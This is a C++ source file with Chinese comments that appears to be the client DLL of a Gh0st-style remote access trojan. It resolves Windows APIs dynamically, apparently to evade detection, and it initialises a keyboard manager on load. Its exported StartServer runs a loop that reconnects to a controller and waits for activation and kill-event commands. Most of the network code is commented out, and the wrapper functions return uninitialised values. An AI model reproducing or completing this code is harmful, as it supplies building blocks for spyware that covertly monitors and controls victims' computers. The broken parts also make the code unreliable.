// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "common\until.h"
#include "common\KernelManager.h"
#include "common\KeyboardManager.h"
#include "common\login.h"
#include "ClientSocket.h"

extern "C"  _declspec(dllexport)
BOOL StartServer();

//		以下函数动态调用的定义
//*******************************************************************************************************************
UINT API_GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize)
{
    UINT result;
    typedef UINT(WINAPI *lpAddFun)(LPSTR, UINT);			//返回值,形参类型参考函数定义
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//函数所在的DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "GetSystemDirectoryA");	//函数名字
    if (addFun != NULL)
    {
        addFun(lpBuffer, uSize);					//调用函数
        FreeLibrary(hDll);					//释放句柄
    }
    return result;
}
BOOL API_GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(LPSTR, LPDWORD);			//返回值,形参类型参考函数定义,去后面的
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//函数所在的DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "GetUserNameA");	//函数名字
    if (addFun != NULL)
    {
        addFun(lpBuffer, pcbBuffer);					//调用函数，去前面的
        FreeLibrary(hDll);					//释放句柄
    }
    return result;
}
int API_WideCharToMultiByte(UINT     CodePage, DWORD    dwFlags, LPCWSTR  lpWideCharStr, int      cchWideChar, LPSTR   lpMultiByteStr, int      cbMultiByte, LPCSTR   lpDefaultChar, LPBOOL  lpUsedDefaultChar)
{
    int result;
    typedef int (WINAPI *lpAddFun)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);			//返回值,形参类型参考函数定义,去后面的
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//函数所在的DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "WideCharToMultiByte");	//函数名字
    if (addFun != NULL)
    {
        addFun(CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr, cbMultiByte, lpDefaultChar, lpUsedDefaultChar);					//调用函数，去前面的
        FreeLibrary(hDll);					//释放句柄
    }
    return result;
}

BOOL API_WriteFile(HANDLE hFile,
    LPCVOID lpBuffer,
    DWORD nNumberOfBytesToWrite,
    LPDWORD lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);			//返回值,形参类型参考函数定义,去后面的
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//函数所在的DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "WriteFile");	//函数名字
    if (addFun != NULL)
    {
        addFun(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);					//调用函数，去前面的
        FreeLibrary(hDll);					//释放句柄
    }
    return result;
}

BOOL API_FreeResource(HGLOBAL hResData)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(HGLOBAL);			//返回值,形参类型参考函数定义,去后面的
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//函数所在的DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "FreeResource");	//函数名字
    if (addFun != NULL)
    {
        addFun(hResData);					//调用函数，去前面的
        FreeLibrary(hDll);					//释放句柄
    }
    return result;
}
BOOL API_SetFileAttributesA(LPCSTR lpFileName, DWORD dwFileAttributes)
{
    BOOL result;
    typedef BOOL(WINAPI *lpAddFun)(LPCSTR, DWORD);			//返回值,形参类型参考函数定义,去后面的
    HINSTANCE hDll = LoadLibrary("kernel32.dll");			//函数所在的DLL
    lpAddFun addFun = (lpAddFun)GetProcAddress(hDll, "SetFileAttributesA");	//函数名字
    if (addFun != NULL)
    {
        addFun(lpFileName, dwFileAttributes);					//调用函数，去前面的
        FreeLibrary(hDll);					//释放句柄
    }
    return result;
}

typedef BOOL(WINAPI *SystemTimeToFileTimeT)
(
CONST SYSTEMTIME *lpSystemTime,
LPFILETIME lpFileTime
);
typedef BOOL(WINAPI *LocalFileTimeToFileTimeT)
(
CONST FILETIME *lpLocalFileTime,
LPFILETIME lpFileTime
);

typedef HRSRC(WINAPI *FindResourceAT)
(
HMODULE hModule,
LPCSTR lpName,
LPCSTR lpType
);

typedef HANDLE(WINAPI *CreateFileAT)
(
LPCSTR lpFileName,
DWORD dwDesiredAccess,
DWORD dwShareMode,
LPSECURITY_ATTRIBUTES lpSecurityAttributes,
DWORD dwCreationDisposition,
DWORD dwFlagsAndAttributes,
HANDLE hTemplateFile
);
FindResourceAT pFindResourceA = (FindResourceAT)GetProcAddress(LoadLibrary("kernel32.dll"), "FindResourceA");
SystemTimeToFileTimeT pSystemTimeToFileTime = (SystemTimeToFileTimeT)GetProcAddress(LoadLibrary("kernel32.dll"), "SystemTimeToFileTime");
LocalFileTimeToFileTimeT pLocalFileTimeToFileTime = (LocalFileTimeToFileTimeT)GetProcAddress(LoadLibrary("kernel32.dll"), "LocalFileTimeToFileTime");
CreateFileAT pCreateFileA = (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"), "CreateFileA");
//*******************************************************************************************************************

enum
{
    NOT_CONNECT, //  还没有连接
    GETLOGINFO_ERROR,
    CONNECT_ERROR,
    HEARTBEATTIMEOUT_ERROR
};







BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
    )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (!CKeyboardManager::MyFuncInitialization())
            return FALSE;
        CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
        CKeyboardManager::m_dwLastMsgTime = GetTickCount();
        CKeyboardManager::Initialization();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DWORD WINAPI ThreadMain(LPVOID lPvoid)
{
    // lpServiceName,在ServiceMain返回后就没有了
    char	strServiceName[256];
    char	strKillEvent[50];
    HANDLE	hInstallMutex = NULL;

    char	*lpszHost = NULL;
    DWORD	dwPort = 80;
    char	*lpszProxyHost = NULL;
    DWORD	dwProxyPort = 0;
    char	*lpszProxyUser = NULL;
    char	*lpszProxyPass = NULL;

    HANDLE	hEvent = NULL;
    CClientSocket socketClient;
    BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接
    while (1)
    {
        // 如果不是心跳超时，不用再sleep一分钟
        if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
        {
            // 1分钟断线重连, 为了尽快响应killevent
            for (int i = 0; i < 1000; i++)
            {
                hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
                if (hEvent != NULL)
                {
                    //socketClient.Disconnect();
                    CloseHandle(hEvent);
                    break;
                }
                // 改一下
                Sleep(60);
            }
        }

        // 上线间隔为2分, 前6个'A'是标志
        /*	if (!getLoginInfo(MyDecode(lpURL + 6), &lpszHost, &dwPort, &lpszProxyHost,
                &dwProxyPort, &lpszProxyUser, &lpszProxyPass))
                {
                bBreakError = GETLOGINFO_ERROR;
                continue;
                }*/
        //if (!socketClient.Connect(lpszHost, dwPort))
        {
            //bBreakError = CONNECT_ERROR;
            continue;
        }
        CKeyboardManager::dwTickCount = GetTickCount();
        // 登录
        DWORD dwExitCode = SOCKET_ERROR;
        //sendLoginInfo_false( &socketClient );
        //CKernelManager	manager(&socketClient, strServiceName, NULL, strKillEvent, lpszHost, dwPort);
        //socketClient.setManagerCallBack(&manager);

        //////////////////////////////////////////////////////////////////////////
        // 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
        //	for (int i = 0; (i < 10 && !manager.IsActived()); i++)
        {
            Sleep(1000);
        }
        // 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
        //	if (!manager.IsActived())
        continue;

        //////////////////////////////////////////////////////////////////////////
        DWORD	dwIOCPEvent;
        do
        {
            hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
            //	dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
            Sleep(500);
        } while (hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

        if (hEvent != NULL)
        {
            //socketClient.Disconnect();
            CloseHandle(hEvent);
            break;
        }
    }

    SetErrorMode(0);
    return NULL;
}


/************************************************************************/
/*
启动服务的线程
*/
/************************************************************************/
extern "C" _declspec(dllexport)
BOOL StartServer()
{
    MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadMain, (LPVOID)NULL, 0, NULL);
    return TRUE;
}

